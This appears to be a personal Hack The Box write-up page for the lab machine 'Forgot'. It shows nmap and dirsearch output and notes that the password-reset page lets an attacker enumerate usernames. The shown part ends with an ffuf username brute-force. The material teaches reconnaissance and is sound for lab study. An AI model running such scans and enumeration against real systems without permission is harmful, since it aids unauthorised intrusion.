<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Format" href="../format/format.html" /><link rel="prev" title="Faculty" href="../faculty/faculty.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Forgot - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="forgot.png" src="../../../../_images/forgot.png" /></p>
<section id="forgot">
<h1>Forgot<a class="headerlink" href="#forgot" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>scans/nmap.initial
<span class="c1"># Nmap 7.93 scan initiated Wed Dec 21 23:26:49 2022 as: nmap -sC -sV -oN scans/nmap.initial 10.10.11.188</span>
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.188
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.32s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">        </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.5<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>48add5b83a9fbcbef7e8201ef6bfdeae<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>b7896c0b20ed49b2c1867c2992741c1f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>18cd9d08a621a8b8b6f79f8d405154fb<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy<span class="w"> </span>Varnish<span class="w"> </span>http<span class="w"> </span>accelerator
<span class="p">|</span>_http-server-header:<span class="w"> </span>Varnish
<span class="p">|</span>_http-title:<span class="w"> </span><span class="m">503</span><span class="w"> </span>Backend<span class="w"> </span>fetch<span class="w"> </span>failed
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
<span class="c1"># Nmap done at Wed Dec 21 23:28:33 2022 -- 1 IP address (1 host up) scanned in 104.36 seconds</span>
</pre></div>
</div>
<p><img alt="login.png" src="../../../../_images/login.png" /><br />
<img alt="wap.png" src="../../../../_images/wap1.png" /></p>
<p>So this is a flask app cached with varnish</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="mf">3.8.10</span>
<span class="n">flask</span><span class="o">/</span><span class="n">werkzeug</span> <span class="mf">2.1.2</span>
<span class="n">varnish</span> <span class="mf">6.2</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.188<span class="w">         </span><span class="m">130</span><span class="w"> </span>⨯

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/10.10.11.188/_23-01-28_22-35-44.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-01-28_22-35-44.log

Target:<span class="w"> </span>http://10.10.11.188/

<span class="o">[</span><span class="m">22</span>:35:44<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">22</span>:36:04<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">  </span>189B<span class="w">  </span>-<span class="w"> </span>/home<span class="w">  </span>-&gt;<span class="w">  </span>/
<span class="o">[</span><span class="m">22</span>:36:08<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/login
<span class="o">[</span><span class="m">22</span>:36:11<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/forgot
<span class="o">[</span><span class="m">22</span>:36:16<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/reset

Task<span class="w"> </span>Completed
</pre></div>
</div>
</section>
<section id="forgot-password-feature">
<h2>Forgot password feature<a class="headerlink" href="#forgot-password-feature" title="Permalink to this heading">#</a></h2>
<p>Login page sends credentials as a urlencoded POST to <code class="docutils literal notranslate"><span class="pre">/login</span></code>
Doesn’t seem to leak if a user exists or not as the message is always <code class="docutils literal notranslate"><span class="pre">Invalid</span> <span class="pre">Credentials</span></code></p>
<p>Hitting the forgot password button does a get to <code class="docutils literal notranslate"><span class="pre">/forgot</span></code><br />
This prompts for a username that is sent to as a GET param to <code class="docutils literal notranslate"><span class="pre">/forgot</span></code><br />
Admin password can’t be reset<br />
Trying to reset a random username gets us a <code class="docutils literal notranslate"><span class="pre">Invalid</span> <span class="pre">users</span></code> response<br />
So we might have a way to enumerate valid users there</p>
<p>Attempting to bruteforce the forgot page to get a valid username:<br />
Looks like I got blacklisted or something</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u &#39;http://10.10.11.188/forgot?username=FUZZ&#39; -c

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.188/forgot?username=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

abree                   [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 92ms]
abraham                 [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 95ms]
abram                   [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 98ms]
abdullah                [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 98ms]
ace                     [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 105ms]
abdul                   [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 105ms]
aby                     [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 119ms]
